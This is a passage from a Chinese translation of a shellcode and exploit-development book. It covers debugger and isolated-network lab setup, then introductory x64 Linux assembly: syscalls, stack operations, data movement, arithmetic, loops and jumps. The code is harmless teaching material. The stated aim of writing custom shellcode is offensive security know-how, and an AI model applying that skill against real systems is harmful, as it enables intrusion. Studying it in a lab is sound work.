首先，我们需要 x86 的*Immunity Debugger*；从[`debugger.immunityinc.com/ID_register.py`](https://debugger.immunityinc.com/ID_register.py)下载 Immunity。填写这个表格，下载，然后使用默认设置安装它，它会要求您确认安装 Python。之后，我们需要安装一个名为`mona`的调试器插件，由 Corelan 团队创建，[`www.corelan.be`](https://www.corelan.be)。这是一个很棒的插件，将帮助我们进行利用开发。从他们的 GitHub 存储库[`github.com/corelan/mona`](https://github.com/corelan/mona)下载`mona.py`文件，然后将其复制到`C:\Program Files (x86)\Immunity Inc\Immunity Debugger\Immunit\PyCommands`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00043.jpeg)

这就是 Immunity Debugger 的外观，它由四个主要窗口组成，正如在 edb-debugger 中所解释的那样。

此外，我们现在有 Python，要确认，只需导航到`C:\Python27\`。然后，点击 Python，Python 解释器将弹出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00044.jpeg)

现在，让我们安装 x64dbg。这也是 Windows x86 和 x64 的调试器，但是当涉及到 x86 Windows 时，没有比 Immunity Debugger 更好的了。

转到[`sourceforge.net/projects/x64dbg/files/snapshots/`](https://sourceforge.net/projects/x64dbg/files/snapshots/)，然后下载最新版本。解压缩然后导航到`/release`以启动**x96dbg**：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00045.jpeg)

然后，点击 x64dbg：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00046.jpeg)

现在我们正在看 x64dbg 界面，它也包含四个主要窗口，正如在 edb-debugger 中所解释的那样：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00047.jpeg)

# 为汇编 x86 配置 Ubuntu

这对于本书来说并不是强制性的，但如果您想尝试 x86 汇编，它已经包含在内。使用的机器将是 Ubuntu 14.04 x86，您可以从[`releases.ubuntu.com/14.04/`](http://releases.ubuntu.com/14.04/)下载。

我们必须遵循先前的说明来安装 NASM、GCC、文本编辑器，我将使用 GDB 作为我的调试器。

# 网络

由于我们将在受害者机器上运行易受攻击的应用程序进行利用研究和注入 shellcode，因此在配置每台机器后，我们必须建立一个安全的网络。这是通过使用主机模式来确保所有机器连接在一起，但它们仍然是脱机的，不会暴露在外部世界中。

如果您使用的是 VirtualBox，则转到首选项|网络并设置主机模式网络：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00048.jpeg)

然后，设置一个与外部 IP 不冲突的 IP 范围，例如：

+   **IP 地址**：`192.168.100.1`

+   **子网掩码**：`255.255.255.0`

然后，您可以从 DHCP 服务器选项卡激活 DHCP 服务器。

您应该在您的`ifconfig`中看到它：

```
$ ifconfig vboxnet0
```

然后，在您的客户机适配器上激活此网络（例如，`vboxnet0`）：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00049.jpeg)

如果您使用的是 VMware Workstation，请转到编辑|虚拟网络编辑器：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00050.jpeg)

此外，您可以确保主机模式网络已启动：

```
$ ifconfig vmnet1
```

然后，从客户机设置中，转到网络适配器，并选择主机模式：与主机共享的私有网络：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00051.jpeg)

# 总结

在本章中，我们安装了三个主要的操作系统：一个用于模拟攻击者机器以尝试远程利用，第二个是 Ubuntu x64，第三个是 Windows 7，最后两个操作系统是受害者。另外，还有一台额外的机器用于尝试汇编 x86。

此外，我们还禁用了 Linux 中的一些安全机制，仅供学习目的，然后我们进行了网络配置。

在下一章中，让我们迈出一大步，学习汇编，这将使我们能够编写自己的 shellcode，并让您真正了解计算机如何执行每个命令。


# 第三章：Linux 中的汇编语言

在本章中，我们将讨论在 Linux 中的汇编语言编程。我们将学习如何构建我们自己的代码。汇编语言是一种低级编程语言。低级编程语言是机器相关的编程，是计算机理解的最简单形式。在汇编中，你将处理计算机架构组件，如寄存器和堆栈，不像大多数高级编程语言，如 Python 或 Java。此外，汇编不是一种可移植的语言，这意味着每种汇编编程语言都特定于一种硬件或一种计算机架构；例如，英特尔有自己特定的汇编语言。我们学习汇编不是为了构建复杂的软件，而是为了构建我们自己定制的 shellcode，所以我们将使它非常简单和简单。

我保证，完成本章后，你将以不同的方式看待每个程序和进程，并且你将能够理解计算机是如何真正执行你的指令的。让我们开始吧！

# 汇编语言代码结构

在这里，我们不会讨论语言结构，而是代码结构。你还记得内存布局吗？

让我们再来看一下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00052.gif)

我们将把我们的**可执行代码**放在`.text`部分，我们的**变量**放在`.data`部分：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00053.jpeg)

让我们也更仔细地看一下堆栈。堆栈是**LIFO**，这意味着**后进先出**，所以它不是随机访问，而是使用推入和弹出操作。推入是将某物推入堆栈顶部。让我们看一个例子。假设我们有一个堆栈，它只包含**0x1234**：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00054.gif)

现在，让我们使用汇编`push 0x5678`将某物推入堆栈。这条指令将值**0x5678**推入堆栈，并将**堆栈指针**指向**0x5678**：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00055.jpeg)

现在，如果我们想要从堆栈中取出数据，我们使用`pop`指令，它将提取推入堆栈的最后一个元素。因此，以相同的堆栈布局，让我们使用`pop rax`来提取最后一个元素，它将提取值**0x5678**并将其移动到**RAX**寄存器：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00056.jpeg)

这很简单！

我们将如何在 Linux x64 上编写汇编代码？实际上，这很简单；你还记得系统调用吗？这就是我们通过调用系统命令来执行我们想要的方式。例如，如果我想要退出一个程序，那么我必须使用`exit`系统调用。

首先，这个文件`/usr/include/x86_64-linux-gnu/asm/unistd_64.h`包含了 Linux x64 的所有系统调用。让我们搜索`exit`系统调用：

```
$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep exit
#define __NR_exit 60
#define __NR_exit_group 231
```

`exit`系统调用有一个系统调用号`60`。

现在，让我们来看一下它的参数：

```
$ man 2 exit 
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00057.jpeg)

只有一个参数，即`status`，它具有`int`数据类型来定义退出状态，例如零状态表示没有错误：

```
void _exit(int status);
```

现在，让我们看看如何使用寄存器来调用 Linux x64 系统调用：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00058.jpeg)

我们只是将**系统调用号**放入**RAX**，然后将**第一个参数**放入**RDI**，**第二个参数**放入**RSI**，依此类推，就像前面的截图所示。

让我们看一看我们将如何调用`exit`系统调用：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00059.gif)

我们只是将**60**，即`exit`系统调用号放入**RAX**，然后将**0**放入**RDI**，这就是退出状态；是的，就是这么简单！

让我们更深入地看一下汇编代码：

```
mov rax, 60
mov rdi, 0
```

第一行告诉处理器将值`60`移动到`rax`中，第二行告诉处理器将值`0`移动到`rdi`中。

正如你所看到的，一条指令的一般结构是`{操作} {目的地}，{来源}`。

# 数据类型

数据类型在汇编中很重要。我们可以用它们来定义变量，或者当我们想要对寄存器或内存的一小部分执行任何操作时使用它们。

以下表格解释了汇编中基于长度的数据类型：

| **名称** | **指令** | **字节** | **位** |
| --- | --- | --- | --- |
| 字节 | `db` | 1 | 8 |
| 字 | `dw` | 2 | 16 |
| 双字 | `dd` | 4 | 32 |
| 四字 | `dq` | 8 | 64 |

为了充分理解，我们将在汇编中构建一个 hello world 程序。

# Hello world

好的，让我们开始深入了解。我们将构建一个 hello world，这无疑是任何程序员的基本构建块。

首先，我们需要了解我们真正需要的是一个系统调用来在屏幕上打印`hello world`。为此，让我们搜索`write`系统调用：

```
$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep write 
#define __NR_write 1
#define __NR_pwrite64 18
#define __NR_writev 20
#define __NR_pwritev 296
#define __NR_process_vm_writev 311
#define __NR_pwritev2 328
```

我们可以看到`write`系统调用的编号是`1`；现在让我们看看它的参数：

```
$ man 2 write
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00060.jpeg)

`write`系统调用有三个参数；第一个是文件描述符：

```
ssize_t write(int fd, const void *buf, size_t count);
```

文件描述符有三种模式：

| **整数值** | **名称** | **`stdio.h`的别名** |
| --- | --- | --- |
| `0` | 标准输入 | `stdin` |
| `1` | 标准输出 | `stdout` |
| `2` | 标准错误 | `stderr` |

因为我们要在屏幕上打印`hello world`，所以我们将选择标准输出`1`，作为第二个参数，它是指向我们要打印的字符串的指针；第三个参数是字符串的计数，包括空格。

以下图表解释了寄存器中将要包含的内容：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00061.gif)

现在，让我们跳到完整的代码：

```
global _start

section .text

_start:

    mov rax, 1
    mov rdi, 1
    mov rsi, hello_world
    mov rdx, length
    syscall

section .data

    hello_world: db 'hello world',0xa
    length: equ $-hello_world
```

在`.data`部分，其中包含所有变量，代码中的第一个变量是`hello_world`变量，数据类型为字节（`db`），它包含一个`hello world`字符串以及`0xa`，表示换行，就像 C 语言中的`\n`一样。第二个变量是`length`，它包含`hello_world`字符串的长度，使用`equ`表示相等，`$-`表示评估当前行。

在`.text`部分，正如我们之前解释的，我们将`1`移动到`rax`，表示`write`系统调用编号，然后我们将`1`移动到`rdi`，表示文件描述符设置为标准输出，然后我们将`hello_world`字符串的地址移动到`rsi`，将`hello_world`字符串的长度移动到`rdx`，最后，我们调用`syscall`，表示执行。

现在，让我们汇编和链接目标代码，如下所示：

```
$ nasm -felf64 hello-world.nasm -o hello-world.o
$ ld hello-world.o -o hello-world
$ ./hello-world 
```

前面命令的输出如下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00062.gif)

它打印了`hello world`字符串，但因为程序不知道接下来要去哪里，所以以`Segmentation fault`退出。我们可以通过添加`exit`系统调用来修复它：

```
global _start

section .text

_start:

    mov rax, 1
    mov rdi, 1
    mov rsi, hello_world
    mov rdx, length
    syscall

    mov rax, 60
    mov rdi, 1
    syscall

section .data

    hello_world: db 'hello world',0xa
    length: equ $-hello_world
```

我们通过将`60`移动到`rax`来添加了`exit`系统调用，然后我们将`1`移动到`rdi`，表示退出状态，最后我们调用`syscall`来执行`exit`系统调用：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00063.jpeg)

让我们汇编链接并再次尝试：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00064.gif)

现在它正常退出了；让我们也使用`echo $?`确认退出状态：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00065.gif)

退出状态是`1`，正如我们选择的！

# 堆栈

正如我们在前一章中讨论的，**堆栈**是为每个运行的应用程序分配的空间，用于存储变量和数据。堆栈支持两种操作（推入和弹出）；**推入**操作用于将元素推入堆栈，这将导致堆栈指针移动到较低的内存地址（堆栈从高内存向低内存增长），并指向堆栈顶部，而**弹出**则取出堆栈顶部的第一个元素。

让我们看一个简单的例子：

```
global _start

section .text

_start:

    mov rdx,0x1234
    push rdx
    push 0x5678
    pop rdi
    pop rsi

    mov rax, 60
    mov rdi, 0
    syscall
section .data
```

这段代码非常简单；让我们编译和链接它：

```
$ nasm -felf64 stack.nasm -o stack.o
$ ld stack.o -o stack
```

然后，我将在调试器中运行应用程序（调试器将在下一章中解释），只是为了向您展示堆栈的真正工作原理。

首先，在运行程序之前，所有寄存器都是空的，除了 RSP 寄存器，它现在指向堆栈顶部`00007ffdb3f53950`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00066.jpeg)

然后，执行第一条指令，将`0x1234`移动到`rdx`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00067.jpeg)

正如我们所看到的，`rdx` 寄存器现在保存着 `0x1234`，而堆栈中还没有发生任何变化。第二条指令将 `rdx` 的值推送到堆栈中，如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00068.jpeg)

看一下堆栈部分；它移动到了较低的地址（从 `50` 到 `48`），现在包含 `0x1234`。第三条指令是直接将 `0x5678` 推送到堆栈中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00069.jpeg)

第四条指令将把堆栈中的最后一个元素提取到 `rdi` 中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00070.jpeg)

你可以看到，堆栈中不再包含 `0x5678`，而是移动到了 `rdi`。最后一条指令是将堆栈中的最后一个元素提取到 `rsi` 中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00071.jpeg)

现在堆栈恢复正常，`0x1234` 移动到了 `rsi`。

到目前为止，我们已经介绍了如何构建一个 hello world 程序以及堆栈中的推送/弹出操作的两个基本示例，我们看到了一些基本指令，比如 `mov`、`push`、`pop`，还有更多内容等待我们去学习。现在，你可能会想为什么我没有解释这些指令，而是先带你看了这些示例。我的策略是带你进入下一节；在这里，我们将学习汇编语言所需的所有基本指令。

# 数据操作

**数据操作** 是在汇编中移动数据，这是一个非常重要的主题，因为我们的大部分操作都将是移动数据来执行指令，所以我们必须真正理解如何使用它们，比如 `mov` 指令，以及如何在寄存器之间和寄存器与内存之间移动数据，复制地址到寄存器，以及如何使用 `xchg` 指令在两个寄存器或寄存器和内存之间交换内容，然后如何使用 `lea` 指令将源的有效地址加载到目的地。

# mov 指令

`mov` 指令是在 Linux 中汇编中使用最重要的指令，我们在所有之前的示例中都使用了它。

`mov` 指令用于在寄存器之间、寄存器和内存之间移动数据。

让我们看一些例子。首先，让我们从直接将数据移动到寄存器开始：

```
global _start

section .text

_start:

    mov rax, 0x1234
    mov rbx, 0x56789

    mov rax, 60
    mov rdi, 0
    syscall

section .data
```

这段代码将会把 `0x1234` 复制到 `rax`，并且把 `0x56789` 复制到 `rbx`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00072.jpeg)

让我们进一步添加一些在寄存器之间移动数据到之前的示例中：

```
global _start

section .text

_start:

    mov rax, 0x1234
    mov rbx, 0x56789

    mov rdi, rax
    mov rsi, rbx

    mov rax, 60
    mov rdi, 0
    syscall

section .data
```

我们刚刚添加的内容将 `rax` 和 `rbx` 的内容分别移动到 `rdi` 和 `rsi`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00073.jpeg)

让我们尝试在寄存器和内存之间移动数据：

```
global _start

section .text

_start:

    mov al, [mem1]
    mov bx, [mem2]
    mov ecx, [mem3]
    mov rdx, [mem4]

    mov rax, 60
    mov rdi, 0
    syscall

section .data
    mem1: db 0x12
    mem2: dw 0x1234
    mem3: dd 0x12345678
    mem4: dq 0x1234567891234567
```

在 `mov al, [mem1]` 中，方括号表示将 `mem1` 的内容移动到 `al`。如果我们使用 `mov al, mem1` 而不带方括号，它将会把 `mem1` 的指针移动到 `al`。

在第一行，我们将 `0x12` 移动到 RAX 寄存器中，因为我们只移动了 8 位，所以我们使用了 AL（RAX 寄存器的低部分，可以容纳 8 位），因为我们不需要使用所有 64 位。还要注意的是，我们将 `mem1` 内存部分定义为 `db`，即字节，或者它可以容纳 8 位。

看一下下面的表格：

| **64 位寄存器** | **32 位寄存器** | **16 位寄存器** | **8 位寄存器** |
| --- | --- | --- | --- |
| RAX | EAX | AX | AH, AL |
| RBX | EBX | BX | BH, BL |
| RCX | ECX | CX | CH, CL |
| RDX | EDX | DX | DH, DL |
| RSI | ESI | SI | SIL |
| RDI | EDI | DI | DIL |
| RSP | ESP | SP | SPL |
| RBP | EBP | BP | BPL |
| R8 | R8D | R8W | R8B |
| R9 | R9D | R9W | R9B |
| R10 | R10D | R10W | R10B |
| R11 | R11D | R11W | R11B |
| R12 | R12D | R12W | R12B |
| R13 | R13D | R13W | R13B |
| R14 | R14D | R14W | R14B |
| R15 | R15D | R15W | R15B |

然后，我们将定义为 `dw` 的值 `0x1234` 移动到 `rbx` 寄存器，然后我们在 BX 中移动了 2 个字节（16 位），它可以容纳 16 位。

然后，我们将定义为 `dd` 的值 `0x12345678` 移动到 RCX 寄存器，它是 4 个字节（32 位），移动到 ECX。

最后，我们将定义为 `dq` 的值 `0x1234567891234567` 移动到 RDX 寄存器，它是 8 个字节（64 位），所以我们将它移动到 RDX 中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00074.jpeg)

在执行后，寄存器中的情况如下。

现在，让我们谈谈从寄存器到内存的数据移动。看看下面的代码：

```
global _start

section .text

_start:

    mov al, 0x34
    mov bx, 0x5678
    mov byte [mem1], al
    mov word [mem2], bx

    mov rax, 60
    mov rdi, 0
    syscall

section .data

    mem1: db 0x12
    mem2: dw 0x1234
    mem3: dd 0x12345678
    mem4: dq 0x1234567891234567
```

在第一和第二条指令中，我们直接将值移动到寄存器中，在第三条指令中，我们将寄存器 RAX（AL）的内容移动到`mem1`中，并用字节指定了长度。然后，在第四条指令中，我们将寄存器 RBX（RX）的内容移动到`mem2`中，并用字指定了长度。

这是在移动任何值之前`mem1`和`mem2`的内容：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00075.jpeg)

下一张截图是在将值移动到`mem1`和`mem2`之后的情况：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00076.jpeg)

# 数据交换

**数据交换**也很容易；它用于交换两个寄存器或寄存器和内存之间的内容，使用`xchg`指令：

```
global _start

section .text

_start:

    mov rax, 0x1234
    mov rbx, 0x5678
    xchg rax, rbx
    mov rcx, 0x9876
    xchg rcx,[mem1]

```

```
    mov rax, 60
    mov rdi, 0
    syscall

section .data
    mem1: dw 0x1234
```

在前面的代码中，我们将`0x1234`移动到`rax`寄存器，然后将`0x5678`移动到`rbx`寄存器：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00077.jpeg)

然后，在第三条指令中，我们使用`xchg`指令交换了`rax`和`rbx`的内容：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00078.jpeg)

然后，我们将`0x9876`推送到`rcx`寄存器，`mem1`保存`0x1234`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00079.jpeg)

现在，交换`rcx`和`mem1`的内容：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00080.jpeg)

# 加载有效地址

**加载有效地址**（**lea**）指令将源的地址加载到目的地：

```
global _start

section .text

_start:

    lea rax, [mem1]
    lea rbx, [rax]

    mov rax, 60
    mov rdi, 0
    syscall

section .data
    mem1: dw 0x1234
```

首先，我们将`mem1`的地址移动到`rax`，然后将`rax`中的地址移动到`rbx`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00081.jpeg)

现在两者都指向`mem1`，其中包含`0x1234`。

# 算术运算

现在，我们将讨论算术运算（加法和减法）。让我们开始：

```
global _start

section .text

_start:

    mov rax,0x1
    add rax,0x2

    mov rbx,0x3
    add bl, byte [mem1]

    mov rcx, 0x9
    sub rcx, 0x1

    mov dl,0x5
    sub byte [mem2], dl

    mov rax, 60
    mov rdi, 0
    syscall

section .data
    mem1: db 0x2
    mem2: db 0x9
```

首先，我们将`0x1`移动到`rax`寄存器，然后加上`0x2`，结果将存储在`rax`寄存器中。

然后，我们将`0x3`移动到`rbx`寄存器，并将包含`0x2`的`mem1`的内容与`rbx`的内容相加，结果将存储在`rbx`中。

然后，我们将`0x9`移动到`rcx`寄存器，然后减去`0x1`，结果将存储在`rcx`中。

然后，我们将`0x5`移动到`rdx`寄存器，从`mem2`中减去`rdx`的内容，并将结果存储在`mem2`的内存部分中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00082.jpeg)

减法后`mem2`的内容如下：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00083.jpeg)

现在，让我们谈谈带进位加法和借位减法：

```
global _start

section .text

_start:

    mov rax, 0x5
    stc
    adc rax, 0x1

    mov rbx, 0x5
    stc
    sbb rbx, 0x1

    mov rax, 60
    mov rdi, 0
    syscall

section .data
```

首先，我们将`0x5`移动到`rax`寄存器，然后设置进位标志，它将携带`1`。之后，我们将`rax`寄存器的内容加上`0x1`，并加到进位标志中，得到`0x7` *(5+1+1)*。

然后，我们将`0x5`移动到`rbx`寄存器并设置进位标志，然后从`rbx`寄存器中减去`0x1`，并且在进位标志中再减去`1`；这将给我们`0x3` *(5-1-1)*：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00084.jpeg)

现在，这里的最后部分是增量和减量操作：

```
global _start

section .text

_start:

    mov rax, 0x5
    inc rax
    inc rax

    mov rbx, 0x6
    dec rbx
    dec rbx

    mov rax, 60
    mov rdi, 0
    syscall

section .data
```

首先，我们将`0x5`移动到`rax`寄存器，将`rax`的值增加`1`，然后再次增加，得到`0x7`。

然后，我们将`0x6`移动到`rbx`寄存器，将`rbx`的值减去`1`，然后再次减去，得到`0x4`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00085.jpeg)

# 循环

现在，我们将讨论汇编中的循环。就像在任何其他高级语言（Python、Java 等）中一样，我们可以使用循环来使用 RCX 寄存器作为计数器进行迭代，然后使用`loop`关键字。让我们看下面的例子：

```
global _start

section .text

_start:

    mov rcx,0x5
    mov rbx,0x1

increment:

    inc rbx
    loop increment

    mov rax, 60
    mov rdi, 0
    syscall

section .data
```

在前面的代码中，我们想要增加 RAX 的内容五次，所以我们将`0x5`移动到`rcx`寄存器，然后将`0x1`移动到`rbx`寄存器：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00086.jpeg)

然后，我们将`increment`标签添加为我们想要重复的块的开始指示，然后我们添加了增量指令到`rbx`寄存器的内容：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00087.jpeg)

然后，我们调用`loop increment`，它将递减 RCX 寄存器的内容，然后再次从`increment`标签开始：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00088.jpeg)

现在它将一直执行，直到 RCX 寄存器为零，然后流程将离开该循环：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00089.jpeg)

现在，如果程序在 RCX 上重写了一个值会怎样？让我们看一个例子：

```
global _start

section .text

_start:

    mov rcx, 0x5

print:

    mov rax, 1
    mov rdi, 1
    mov rsi, hello
    mov rdx, length
    syscall

loop print

    mov rax, 60
    mov rdi, 0
    syscall

section .data
    hello: db 'Hello There!',0xa
    length: equ $-hello
```

执行此代码后，程序将陷入无限循环，如果我们仔细观察，我们将看到代码在执行系统调用后覆盖了 RCX 寄存器中的值：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00090.jpeg)

因此，我们必须找到一种方法来保存 RCX 寄存器，比如将其保存在堆栈中。首先，在执行系统调用之前，我们将当前值推送到堆栈中，然后在执行系统调用后，我们再次用我们的值覆盖 RCX 中的任何内容，然后递减该值并再次将其推送到堆栈中以保存它：

```
global _start

section .text

_start:

    mov rcx, 0x5

increment:

    push rcx
    mov rax, 1
    mov rdi, 1
    mov rsi, hello
    mov rdx, length
    syscall
    pop rcx

loop increment

    mov rax, 60
    mov rdi, 0
    syscall

section .data
    hello: db 'Hello There!',0xa
    length: equ $-hello
```

通过这种方式，我们保存了 RCX 寄存器中的值，然后再次将其弹出到 RCX 中以使用它。请看上述代码中的`pop rcx`指令。RCX 再次回到`0x5`，正如预期的那样：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00091.jpeg)

# 控制流程

在这里，我们将讨论控制执行流程。执行流程的正常流程是执行步骤 1，然后 2，依此类推，直到代码正常退出。如果我们决定在步骤 2 中发生某些事情，然后跳过 3，直接执行 4，或者我们只是想跳过步骤 3 而不等待发生某些事情，有两种跳转类型：

+   无条件改变流程

+   根据标志的更改改变流程

现在，让我们从无条件跳转开始：

```
global _start

section .text

_start:

jmp exit_ten

    mov rax, 60
    mov rdi, 12
    syscall

    mov rax, 60
    mov rdi, 0
    syscall

exit_ten:

    mov rax, 60
    mov rdi, 10
    syscall

    mov rax, 60
    mov rdi, 1
    syscall

section .data
```

先前的代码包含四个`exit`系统调用，但具有不同的退出状态（`12`，`0`，`10`，`1`），并且我们从`jmp exit_ten`开始，这意味着跳转到`exit_ten`位置，它将跳转到代码的这一部分：

```
    mov rax, 60
    mov rdi, 10
    syscall
```

执行并正常退出，退出状态为`10`。请注意，下一部分将永远不会被执行：

```
    mov rax, 60
    mov rdi, 12
    syscall

    mov rax, 60
    mov rdi, 0
    syscall
```

让我们确认一下：

```
$ nasm -felf64 jmp-un.nasm -o jmp-un.o
$ ld jmp-un.o -o jmp-un
$ ./jmp-un
$ echo $?
```

先前命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00092.jpeg)

正如我们所看到的，代码以退出状态`10`退出。

让我们看另一个例子：

```
global _start

section .text

_start:

    mov rax, 1
    mov rdi, 1
    mov rsi, hello_one
    mov rdx, length_one
    syscall

jmp print_three

    mov rax, 1
    mov rdi, 1
    mov rsi, hello_two
    mov rdx, length_two
    syscall

print_three:
    mov rax, 1
    mov rdi, 1
    mov rsi, hello_three
    mov rdx, length_three
    syscall

    mov rax, 60
    mov rdi, 11
    syscall

section .data

    hello_one: db 'hello one',0xa
    length_one: equ $-hello_one

    hello_two: db 'hello two',0xa
    length_two: equ $-hello_two

    hello_three: db 'hello three',0xa
    length_three: equ $-hello_three
```

在先前的代码中，它开始打印`hello_one`。然后，它将到达`jmp print_three`，执行流程将更改到`print_three`位置，并开始打印`hello_three`。以下部分将永远不会被执行：

```
    mov rax, 1
    mov rdi, 1
    mov rsi, hello_two
    mov rdx, length_two
    syscall
```

让我们确认一下：

```
$ nasm -felf64 jmp_hello.nasm -o jmp_hello.o
$ ld jmp_hello.o -o jmp_hello
$ ./jmp_hello
```

先前命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00093.jpeg)

现在，让我们继续讨论带条件的跳转，老实说，我们无法在这里涵盖所有条件，因为列表非常长，但我们将看到一些例子，以便您理解概念。

`jb`指令表示如果**进位标志**（**CF**）被设置（CF 等于`1`）则执行跳转。

正如我们之前所说，我们可以使用`stc`指令手动设置 CF。

让我们修改先前的例子，但使用`jb`指令，如下所示：

```
global _start

section .text

_start:

    mov rax, 1
    mov rdi, 1
    mov rsi, hello_one
    mov rdx, length_one
    syscall

    stc

jb print_three

    mov rax, 1
    mov rdi, 1
    mov rsi, hello_two
    mov rdx, length_two
    syscall

print_three:
    mov rax, 1
    mov rdi, 1
    mov rsi, hello_three
    mov rdx, length_three
    syscall

    mov rax, 60
    mov rdi, 11
    syscall

section .data

    hello_one: db 'hello one',0xa
    length_one: equ $-hello_one

    hello_two: db 'hello two',0xa
    length_two: equ $-hello_two

    hello_three: db 'hello three',0xa
    length_three: equ $-hello_three
```

如您所见，我们执行了`stc`来设置进位标志（即 CF 等于`1`），然后我们使用`jb`指令进行测试，这意味着如果 CF 等于`1`，则跳转到`print_three`。

以下是另一个例子：

```
global _start

section .text

_start:

    mov al, 0xaa
    add al, 0xaa

jb exit_ten

    mov rax, 60
    mov rdi, 0
    syscall

exit_ten:

    mov rax, 60
    mov rdi, 10
    syscall

section .data
```

在先前的例子中，加法操作将设置进位标志，然后我们使用`jb`指令进行测试；如果 CF 等于`1`，则跳转到`exit_ten`。

现在，让我们看一个不同的方法，即如果小于或等于（`jbe`）指令，这意味着 CF 等于`1`或**零标志（ZF）**等于`1`。先前的例子也可以工作，但让我们尝试其他方法来设置 ZF 等于`1`：

```
global _start

section .text

_start:

    mov al, 0x1
    sub al, 0x1

jbe exit_ten

    mov rax, 60
    mov rdi, 0
    syscall

exit_ten:

    mov rax, 60
    mov rdi, 10
    syscall

section .data
```

在先前的代码中，减法操作将设置 ZF，然后我们将使用`jbe`指令来测试 CF 等于`1`或 ZF 等于`1`；如果为真，则会跳转执行`exit_ten`。

另一种类型是如果不是符号（`jns`），这意味着 SF 等于`0`：

```
global _start

section .text

_start:

mov al, 0x1
sub al, 0x3

jns exit_ten

    mov rax, 60
    mov rdi, 0
    syscall

exit_ten:

    mov rax, 60
    mov rdi, 10
    syscall

section .data
```

在先前的代码中，减法操作将设置**符号标志**（**SF**）等于`1`。之后，我们将测试 SF 是否等于`0`，这将失败，它不会跳转执行`exit_ten`，而是继续以退出状态`0`正常退出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00094.jpeg)

# 过程

汇编中的过程可以像高级语言中的函数一样，这意味着你可以编写一段代码块，然后调用它来执行。

例如，我们可以构建一个过程，可以接受两个数字并将它们相加。而且，我们可以在执行过程中多次使用`call`指令。

